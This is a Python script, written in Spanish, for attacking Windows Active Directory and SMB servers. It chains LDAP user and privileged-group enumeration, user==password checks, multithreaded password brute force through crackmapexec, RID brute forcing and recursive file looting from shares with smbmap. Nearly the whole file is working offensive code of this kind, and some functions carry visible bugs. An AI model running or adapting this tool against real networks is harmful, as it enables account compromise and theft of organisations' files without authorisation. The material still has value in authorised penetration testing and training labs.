import argparse
import threading
import time
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import signal
from windapsearch import LDAPSession
import subprocess, re, sys, os, ldap
from contextlib import suppress, contextmanager, redirect_stdout, redirect_stderr
SHOW_ATTEMPTS = False
FQDN_DOM = ""        # dominio completo, ej. megabank.local   (para CME)
NETBIOS_DOM = ""     # nombre corto,     ej. MEGABANK         (para logs)     
valid_credentials = Queue()
usuarios_exitosos = set()
found = threading.Event()
RID_DONE = True
carpetas_accesibles = {}
usuarios_enum = set()
found_users = set()
FILE_REGEX = r"(?:docx?|xlsx?|pptx?|pdf|txt|xml|csv|config|Backup)"
TARGET_GROUPS = [
    "Remote Management Users",
    "Remote Desktop Users",
    "Azure Admins",
    "Domain Admins",
]

MAX_HITS = 200     # deja 0 para sin l√≠mite
def short_dom(dom: str) -> str:
    if not dom:
        return ""
    return dom.split(".")[0].upper()

def smbmap_hits_stream(ip, share, user, pwd, netbios_dom, regex):
    cmd = [
        "smbmap", "-H", ip, "-u", user, "-p", pwd, "-d", netbios_dom,
        "-A", regex, "-R", share
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            text=True, bufsize=1)

    hits = []
    for line in proc.stdout:
        if line.startswith("[+] Match found!"):
            path = line.split("Downloading:")[1].strip()
            hits.append(path)
            print("      ‚Ä¢", path)
            if MAX_HITS and len(hits) >= MAX_HITS:
                print("      ‚Ä¶ l√≠mite de hits alcanzado, deteniendo b√∫squeda ‚Ä¶")
                proc.kill()
                break
    proc.stdout.close()
    proc.wait()
    return hits

def signal_handler(sig, frame):
    print("\n\033[33m[!] Interrupci√≥n recibida. Terminando ejecuci√≥n...\033[0m")
    sys.exit(0)

@contextmanager
def silence():
    with open(os.devnull, "w") as devnull, \
         redirect_stdout(devnull), \
         redirect_stderr(devnull):
        yield

def check_host_availability(ip_target):
    """Verifica si el host est√° disponible antes de iniciar pruebas."""
    print(f"\033[34m[INFO] Verificando disponibilidad del host {ip_target}...\033[0m")
    
    cmd = ["ping", "-c", "1", ip_target]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

    
    if "1 received" in result.stdout:
        print(f"\033[32m[‚úî] El host {ip_target} est√° en l√≠nea.\033[0m")
        return True
    else:
        print(f"\033[31m[‚úò] El host {ip_target} no responde. Saliendo...\033[0m")
        return False

def check_anonymous_access(ip_target):
    """Verifica si es posible autenticarse con credenciales nulas en SMB."""
    print("\033[34m[INFO] Verificando autenticaci√≥n an√≥nima en SMB...\033[0m")
    
    cmd = ["smbclient", "-L", ip_target, "-N"]
    result = subprocess.run(cmd, capture_output=True, text=True)

    if "Anonymous login successful" in result.stdout:
        print(f"\033[32m[‚úî] Autenticaci√≥n an√≥nima permitida en {ip_target}.\033[0m")
        return True
    else:
        print(f"\033[31m[‚úò] No se permite autenticaci√≥n an√≥nima en {ip_target}.\033[0m")
        return False

def try_user_password(ip, user, password, domain):
    pretty_dom = domain or "WORKGROUP"
    if SHOW_ATTEMPTS:
        print(f"\033[90m[‚Üí] Probando {pretty_dom}\\{user}:{password}\033[0m")

    try:
        result = subprocess.run(
            ["crackmapexec", "smb", ip, "-u", user, "-p", password, "-d", domain],
            capture_output=True, text=True, timeout=15
        )
        CME_OK = re.compile(r"(?:\[\+\]|VALID|STATUS_SUCCESS|PASSWORD_MUST_CHANGE|PASSWORD_EXPIRED)",re.I)

        if CME_OK.search(result.stdout):
            # ---------- password must change / expired ----------
            if re.search(r"PASSWORD[ _]MUST[ _]CHANGE|PASSWORD_EXPIRED",
                        result.stdout, re.I):
                note = " (¬°contrase√±a expirada / debe cambiarse!)"
            else:
                note = ""
            print(f"\033[32m[‚úî] Credenciales v√°lidas{note}: "
                f"{pretty_dom}\\{user}:{password}\033[0m")
            valid_credentials.put((user, password))
            usuarios_exitosos.add(user)
            return True
        elif "STATUS_LOGON_FAILURE" in result.stdout and SHOW_ATTEMPTS:
            print(f"\033[31m[‚úò] Fall√≥: {domain}\\{user}:{password}\033[0m")
    except subprocess.TimeoutExpired:
        if SHOW_ATTEMPTS:
            print(f"\033[33m[!] Timeout al probar: {domain}\\{user}:{password}\033[0m")
    except Exception as e:
        print(f"\033[31m[ERROR] Error probando {user}:{password} ‚Üí {e}\033[0m")
    return False

def brute_force_users(ip_target, user_list, password_list, domain, max_threads=5):
    print("\033[34m[INFO] Iniciando fuerza bruta de autenticaci√≥n...\033[0m")

    with open(user_list, "r") as users_file, open(password_list, "r", errors="ignore") as passwords_file:
        users = [u.strip() for u in users_file if u.strip()]
        passwords = [p.strip() for p in passwords_file if p.strip()]

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # 1. Probar user:user primero
    # Lanzamos un Future por (usuario, password) combinando toda la wordlist
        futures = []
        for user in users:
            if user in usuarios_exitosos:
                continue
            # user:user al principio
            futures.append(executor.submit(try_user_password,
                                           ip_target, user, user, domain))
            # luego la lista completa
            for pwd in passwords:
                futures.append(executor.submit(try_user_password,
                                               ip_target, user, pwd, domain))
        # Esperamos a que terminen para evitar que el main termine prematuro
        print(f"[i] Se programar√°n {len(users)*len(passwords)} intentos (m√°x. {max_threads} concurrentes).")
        for _ in as_completed(futures):
            pass

def print_resumen(valid_credentials, carpetas_accesibles, usuarios_enum):
    print("\n" + "="*60)
    print("üîê RESUMEN FINAL")
    print("="*60)

    # Credenciales v√°lidas
    if not valid_credentials.empty():
        print("\n[‚úî] Credenciales v√°lidas encontradas:")
        temp = []
        while not valid_credentials.empty():
            user, pwd = valid_credentials.get()
            temp.append((user, pwd))
            print(f"   - {user}:{pwd}")
        # Reinsertar si quieres conservarlos
        for user, pwd in temp:
            valid_credentials.put((user, pwd))
    else:
        print("\n[‚úò] No se encontraron credenciales v√°lidas.")

    # Carpetas accesibles
    if carpetas_accesibles:
        print("\nüìÅ Carpetas accesibles:")
        for user, shares in carpetas_accesibles.items():
            print(f"   - {user}:")
            for s in shares:
                print(f"     ‚Ä¢ {s}")
    else:
        print("\n[‚úò] No se accedi√≥ a carpetas compartidas.")

    # Usuarios enumerados
    if usuarios_enum:
        print(f"\nüë• Usuarios enumerados v√≠a RID brute force ({len(usuarios_enum)}):")
        for u in sorted(usuarios_enum):
            print(f"   - {u}")
    else:
        print("\n[‚úò] No se enumeraron usuarios.")

    print("="*60 + "\n")

def authenticate_user(ip_target, user, password, domain, print_result=True):
    """Verifica si las credenciales son v√°lidas."""
    if not user and not password:
        return False

    cmd = ["crackmapexec", "smb", ip_target, "-u", user, "-p", password, "-d", domain]
    result = subprocess.run(cmd, capture_output=True, text=True)

    if "[+]" in result.stdout:
        if print_result:
            print(f"\033[32m[‚úî] Credenciales v√°lidas encontradas: {domain}\\{user}:{password}\033[0m")
        valid_credentials.put((user, password))
        return True
    return False

def ldap_enum_groups(ldap_sess):
    groups, attrs = ldap_sess.getAllGroups(attrs=['cn'])
    print(f"\n[+] Total grupos: {len(groups)}\n")
    for g in groups:
        print("  -", g.get_attr_values('cn')[0].decode())

def ldap_group_members(ldap_sess, group_name, add_to_list=False, list_file=None):
    # si no es DN hacemos b√∫squeda difusa
    if not group_name.upper().startswith("CN="):
        search = ldap_sess.doFuzzySearch(group_name, objectCategory='group')
        if not search:
            print("[!] Grupo no encontrado")
            return []
        group_dn = search[0].dn
    else:
        group_dn = group_name

    members = ldap_sess.queryGroupMembership(group_dn, getUPNs=False)
    print(f"\n[+] {len(members)} miembros en {group_name}:\n")
    for m in members:
        print("  ‚Ä¢", m.decode())

    if add_to_list and list_file:
        with open(list_file, "a") as f:
            for dn in members:
                cn = dn.decode().split(",")[0].split("=")[1]
                f.write(cn + "\n")
        print(f"[üíæ] Miembros a√±adidos a {list_file}")

    return members

def add_members_to_userlist(members, list_file):
    added = 0
    with open(list_file, "a+") as f:                # ‚Äúa+‚Äù para leer/escribir
        f.seek(0)
        existing = {u.strip().lower() for u in f}
        for dn in members:
            cn = dn.decode().split(",")[0].split("=")[1]
            if cn.lower() not in existing:
                f.write(cn + "\n")
                added += 1
    if added:
        print(f"[üíæ] {added} miembros a√±adidos a {list_file}")
    return added

def smbmap_loot(ip, share, user, pwd, netbios_dom, regex):
    cmd = [
        "smbmap", "-H", ip,
        "-u", user, "-p", pwd, "-d", netbios_dom,
        "-A", regex, "-R", share
    ]
    res = subprocess.run(cmd, capture_output=True, text=True)
    hits = [ln.split("Downloading:")[1].strip()
            for ln in res.stdout.splitlines()
            if ln.startswith("[+] Match found!")]
    return hits

def list_shares(ip, user, pwd, dom):
    shares = []

    # 1) Intento con smbmap
    res = subprocess.run(
        ["smbmap", "-H", ip, "-u", user, "-p", pwd, "-d", dom or ""],
        capture_output=True, text=True
    )
    for ln in res.stdout.splitlines():
        # Acepta 'READ ONLY', 'READ,WRITE' y 'READ, WRITE'
        m = re.match(r"^\s*([A-Za-z0-9$._-]+)\s+(READ(?:\s*,?\s*WRITE)?|READ ONLY|WRITE ONLY|NO ACCESS|UNKNOWN)", ln, re.I)
        if m:
            perm = m.group(2).upper()
            # Considera lectura y/o escritura
            if "READ" in perm or "WRITE" in perm:
                shares.append(m.group(1))

    if shares:
        return sorted(set(shares))

    # 2) Fallback con smbclient
    if user or pwd:
        target = f"{dom}\\{user}%{pwd}" if dom else f"{user}%{pwd}"
        cmd2 = f"smbclient -L //{ip} -U {target} -m SMB3 -g"
    else:
        # an√≥nimo
        cmd2 = f"smbclient -L //{ip} -N -m SMB3 -g"

    res2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)

    # Formato -g: "Disk|Sharename|Comentario"
    for ln in res2.stdout.splitlines():
        if '|' in ln:
            parts = [p.strip() for p in ln.split('|')]
            if len(parts) >= 2 and parts[0] in ('Disk', 'Printer', 'IPC'):
                name = parts[1]
                if name:  # evita vac√≠os
                    shares.append(name)
        else:
            # Formato cl√°sico (sin -g) por si la versi√≥n no soporta -g
            m2 = re.match(r"^\s*([A-Za-z0-9$._-]+)\s+(Disk|IPC|Printer)", ln)
            if m2:
                shares.append(m2.group(1))

    return sorted(set(shares))

def loot_shares(ip, user, pwd, netbios_dom, regex, do_rid=True):
    who = f"{netbios_dom}\\{user}" if user else f"{netbios_dom}\\(an√≥nimo)"
    print(f"\n\033[34m[INFO] Buscando ficheros en shares con {who} ‚Ä¶\033[0m")

    # Normaliza "xlsx,docx" -> "xlsx|docx" para smbmap -A
    if regex and "," in regex and not any(ch in regex for ch in r".*|[](){}?+"):
        regex = "|".join([x.strip() for x in regex.split(",") if x.strip()])

    shares = list_shares(ip, user, pwd, netbios_dom)

    if not shares:
        print("   ‚ÜØ Sin shares READ/WRITE detectadas con estas credenciales")
        return

    carpetas_accesibles.setdefault(user or "(anon)", []).extend(shares)

    for sh in shares:
        print(f"   ‚Üª {sh}")
        if regex:
            smbmap_hits_stream(ip, sh, user, pwd, netbios_dom, regex)

def enumeracion_usuarios_smb(ip, usuario, password, dominio, archivo_userlist):
    print(f"\n[üîç] Enumerando usuarios v√≠a RID brute force con {dominio}\\{usuario}...\n")

    cmd = [
        "crackmapexec", "smb", ip,
        "-u", usuario,
        "-p", password,
        "--rid-brute"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)

        usuarios_encontrados = []
        for line in result.stdout.splitlines():
            if "SidTypeUser" in line:
                m = re.search(r'\b[A-Za-z0-9_.-]+\\([A-Za-z0-9_.\-$]+)\b', line)
                if m:
                    username = m.group(1)
                    if username not in found_users:
                        print(f"[‚úî] Se ha encontrado el usuario: {username}")
                        found_users.add(username)
                        users_found.append(username)

        if usuarios_encontrados:
            # Guardar en archivo usuarios_encontrados.txt
            with open("usuarios_encontrados.txt", "w") as f:
                for u in usuarios_encontrados:
                    f.write(f"{u}\n")

            # Hacer append a lista original de usuarios
            with open(archivo_userlist, "a") as f:
                for u in usuarios_encontrados:
                    f.write(f"{u}\n")

            print(f"\n[üíæ] {len(usuarios_encontrados)} usuarios agregados a {archivo_userlist}\n")

            return True  # √âxito
        else:
            print("[‚úò] No se encontraron usuarios o no se tiene acceso suficiente.\n")
            return False

    except FileNotFoundError:
        print("[‚úò] Error: crackmapexec no est√° instalado o no est√° en PATH.\n")
        return False
    except Exception as e:
        print(f"[‚úò] Error durante la enumeraci√≥n de usuarios: {e}\n")
        return False

def explore_share_tree(ip, share, user, password, domain, depth=2, prefix=""):
    if depth == 0:
        return

    cmd = f"smbclient \\\\{ip}\\{share} -U {domain}\\{user}%{password} -c 'ls'"
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

    for line in result.stdout.splitlines():
        line = line.strip()
        if not line or line.startswith(".") or "blocks" in line:
            continue
        parts = line.split()
        if len(parts) >= 1:
            name = parts[0]
            is_dir = line.endswith("D")

            print(f"{prefix}‚îú‚îÄ‚îÄ {name}/" if is_dir else f"{prefix}‚îú‚îÄ‚îÄ {name}")

            if is_dir:
                subcmd = f"smbclient \\\\{ip}\\{share} -U {domain}\\{user}%{password} -c 'cd \"{name}\"; ls'"
                sub_result = subprocess.run(subcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                for subline in sub_result.stdout.splitlines():
                    subline = subline.strip()
                    if not subline or subline.startswith(".") or "blocks" in subline:
                        continue
                    subparts = subline.split()
                    if len(subparts) >= 1:
                        subname = subparts[0]
                        print(f"{prefix}‚îÇ   ‚îú‚îÄ‚îÄ {subname}/" if subline.endswith("D") else f"{prefix}‚îÇ   ‚îú‚îÄ‚îÄ {subname}")

def quick_self_password_check(ip_target, user_file, domain, max_threads=10):
    """Prueba usuario:usuario para toda la lista en paralelo."""
    print("\033[36m[‚Üª] Probando credenciales user==password...\033[0m")
    with open(user_file, "r") as f:
        users = [u.strip() for u in f if u.strip()]

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futs = [
            executor.submit(try_user_password, ip_target, u, u, domain)
            for u in users if u not in usuarios_exitosos
        ]
        for _ in as_completed(futs):
            pass  # Esperamos a que concluyan

def ldap_members_of(ldap_sess, group_cn, nested=False):
    """Devuelve lista de DN de miembros. Usa b√∫squeda difusa."""
    if nested:   # Domain Admins y similares
        daDN = f"CN={group_cn},CN=Users,{ldap_sess.domainBase}"
        res, _ = ldap_sess.getNestedGroupMemberships(daDN, attrs=['dn'])
        return [r.dn.encode() for r in res]

    # normal
    search = ldap_sess.doFuzzySearch(group_cn, objectCategory='group')
    if not search:
        return []
    group_dn = search[0].dn
    return ldap_sess.queryGroupMembership(group_dn)

def hunt_files(ip, share, user, password, domain, regex):
    print(f"\n[üîé] Buscando archivos ‚Äú{regex}‚Äù en {share} ‚Ä¶")
    cmd = [
        "smbmap", "-H", ip,
        "-u", user, "-p", password, "-d", domain,
        "-A", regex, "-R", share
    ]
    res = subprocess.run(cmd, capture_output=True, text=True)
    hits = []
    for line in res.stdout.splitlines():
        if line.startswith("[+] Match found!"):
            # ‚Äú‚Ä¶ Downloading: users$\\mhope\\azure.xml‚Äù
            path = line.partition("Downloading:")[2].strip()
            hits.append(path)

    if hits:
        print(f"    üìÑ {len(hits)} archivo(s) encontrados:")
        for h in hits:
            print("     ‚Ä¢", h)
    else:
        print("    ‚Äî sin coincidencias ‚Äî")

def main():
    signal.signal(signal.SIGINT, signal_handler)
    parser = argparse.ArgumentParser(description="Pentest SMB en Windows")
    parser.add_argument("-ip-target", required=True, help="IP del DC o servidor SMB")
    parser.add_argument("-user-list", help="Archivo con usuarios (opcional si LDAP activo)")
    parser.add_argument("-password-list", required=True, help="Lista de contrase√±as")
    parser.add_argument("-d", "--domain", help="Dominio FQDN o NetBIOS (opcional)")
    parser.add_argument("-v", "--verbose-attempts",action="store_true",help="Mostrar en consola cada usuario:contrase√±a que se intente")
    parser.add_argument("--loot", metavar="EXTS",help="Buscar ficheros ‚Äì ej: xlsx,docx,txt,xml (usa smbmap -A ... -R)")
    parser.add_argument("--skip-ldap", action="store_true",help="Omite toda comunicaci√≥n LDAP (detect/enum)")
    parser.add_argument("--ldap-user")
    parser.add_argument("--ldap-pass")
    g = parser.add_argument_group("Enumeraci√≥n LDAP adicional")
    g.add_argument("--enum-groups", action="store_true",
                help="Enumerar todos los grupos de AD (usa LDAP)")
    g.add_argument("-m", "--members", metavar="GROUP_NAME",
                help='Enumerar miembros de un grupo, e.g. "Remote Management Users"')
    g.add_argument("--add-members", action="store_true",
                help="A√±adir los miembros obtenidos al user-list para fuerza bruta")
    g.add_argument("--check-priv-groups", action="store_true",
               help="Enumera miembros de los grupos remotos/RDP/Azure/DomainAdmins")
    g.add_argument("--add-priv-members", action="store_true",
               help="A√±ade los miembros descubiertos al user-list")


    args = parser.parse_args()
    # Guardamos la referencia del user-list elegido o generado
    global SHOW_ATTEMPTS
    SHOW_ATTEMPTS = args.verbose_attempts
    global USER_LIST_FILE
    USER_LIST_FILE = args.user_list
    if not check_host_availability(args.ip_target):
        return

    # 1Ô∏è‚É£  Auto-detectar dominio (si no viene por CLI)
    FQDN_DOM = NETBIOS_DOM = ""
    if not args.skip_ldap:
        try:
            ldap_sess = LDAPSession(
                dc_ip=args.ip_target,
                username=args.ldap_user or "",
                password=args.ldap_pass or "",
                domain=""          # no lo sabemos todav√≠a
            )
            # bind: con user/pass si se dieron, si no -> an√≥nimo
            ldap_sess.do_bind()
            fqdn_dn  = ldap_sess.getDefaultNamingContext()
            FQDN_DOM = ".".join(x.split("=")[1] for x in fqdn_dn.split(","))
            NETBIOS_DOM = FQDN_DOM.split(".")[0].upper()
            print(f"\033[32m[‚úî] Dominio detectado: {FQDN_DOM} (short: {NETBIOS_DOM})\033[0m")
        except ldap.LDAPError as e:
            print(f"\033[33m[!] LDAP fall√≥ ({e.args[0].get('desc')}); seguimos sin dominio.\033[0m")
    else:
        print("[i] LDAP deshabilitado con --skip-ldap")
    # tras autodetectar (o fallar) el dominio...
    detected_short = short_dom(FQDN_DOM) if 'FQDN_DOM' in locals() and FQDN_DOM else ""
    cli_short      = short_dom(args.domain) if args.domain else ""

    # Dominio a usar para herramientas SMB (smbmap, CME):
    SMB_DOM = cli_short or detected_short or "WORKGROUP"

    # Dominio ‚Äúbonito‚Äù para imprimir (FQDN si existe, si no el corto):
    PRETTY_DOM = (args.domain or FQDN_DOM or SMB_DOM)

    # --enum-groups
    if args.enum_groups or args.members:
        ldap_sess = ldap_sess if 'ldap_sess' in locals() else LDAPSession(
            dc_ip=args.ip_target, domain=FQDN_DOM)

    if args.enum_groups:
        ldap_enum_groups(ldap_sess)

    if args.members:
        members = ldap_group_members(ldap_sess, args.members)
        if args.add_members and args.user_list:
            if add_members_to_userlist(members, args.user_list):
                quick_self_password_check(args.ip_target, args.user_list, SMB_DOM)
    if args.check_priv_groups:
        ldap_sess = ldap_sess if 'ldap_sess' in locals() else LDAPSession(
        dc_ip=args.ip_target, domain=FQDN_DOM)

    print("\n‚îÄ‚îÄ‚îÄ Enumeraci√≥n de grupos sensibles ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ")
    total_new = 0

    for gname in TARGET_GROUPS:
        nested   = gname.lower() == "domain admins"
        members  = []                       

        try:
            with suppress(SystemExit):
                with silence():                 
                    members = ldap_members_of(ldap_sess, gname, nested=nested)

        except ldap.LDAPError as e:
            msg = e.args[0].get('desc', 'LDAP error')
            print(f"[√ó] {gname}: {msg}")
            continue                               # pasa al siguiente grupo

        if not members:
            print(f"[√ó] Grupo ‚Äú{gname}‚Äù no encontrado o sin miembros")
            continue

        print(f"\n[+] {gname}  ‚Üí  {len(members)} miembros")
        for dn in members:
            cn = dn.decode().split(",")[0].split("=")[1]
            print(f"    ‚Ä¢ {cn}")

        if args.add_priv_members and args.user_list:
            added = add_members_to_userlist(members, args.user_list)
            total_new += added

    if not args.user_list:
        try:
            ldap_sess = ldap_sess if 'ldap_sess' in locals() else LDAPSession(dc_ip=args.ip_target)
            users, _   = ldap_sess.getAllUsers(attrs=['sAMAccountName'])
            args.user_list = "tmp_ldap_users.txt"
            with open(args.user_list, "w") as f:
                for u in users:
                    if u.has_attribute('sAMAccountName'):
                        f.write(u.get_attr_values('sAMAccountName')[0].decode() + "\n")
            print(f"\033[32m[‚úî] {len(users)} usuarios guardados en {args.user_list}\033[0m")
        except Exception as e:
            print(f"\033[33m[!] No se gener√≥ lista de usuarios via LDAP: {e}\033[0m")
            print("\033[33m[!] Continuaremos solo con fuerza bruta si proporcionas -user-list.\033[0m")

    # Prueba user==password con el dominio ya normalizado (siempre):
    if args.user_list:
        quick_self_password_check(args.ip_target, args.user_list, SMB_DOM)
    else:
        print("\033[31m[‚úò] Se requiere -user-list (o LDAP funcional) para continuar.\033[0m")
        return

    if not args.user_list:
        print("\033[31m[‚úò] Se requiere -user-list (o LDAP funcional) para continuar.\033[0m")
        return

    if check_anonymous_access(args.ip_target) and args.loot:
        loot_shares(args.ip_target, "", "", SMB_DOM, args.loot, do_rid=False)

    brute_force_thread = threading.Thread(
        target=brute_force_users,
        args=(args.ip_target, args.user_list, args.password_list, SMB_DOM)
    )
    brute_force_thread.start()

    found_users = set()

    last_beat = time.time()
    while brute_force_thread.is_alive():
        pumped = False
        while not valid_credentials.empty():
            pumped = True
            user, password = valid_credentials.get()
            if user == "" and password == "":
                continue
            loot_shares(args.ip_target, user, password, SMB_DOM, args.loot, do_rid=True)
            # ... RID brute como ya lo tienes ...

        if not pumped and time.time() - last_beat > 5:
            print("[‚Ä¶] Brute force en curso, esperando credenciales v√°lidas‚Ä¶")
            last_beat = time.time()

        time.sleep(0.5)

    # 2¬™ pasada con los usuarios reci√©n descubiertos
    if found_users:
        print(f"\n[‚Üª] Reintentando fuerza bruta para {len(found_users)} nuevos usuarios...\n")
        brute_force_users(args.ip_target, args.user_list,
                          args.password_list, SMB_DOM)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Interrupci√≥n recibida. Terminando ejecuci√≥n...\033[0m")
        sys.exit(0)

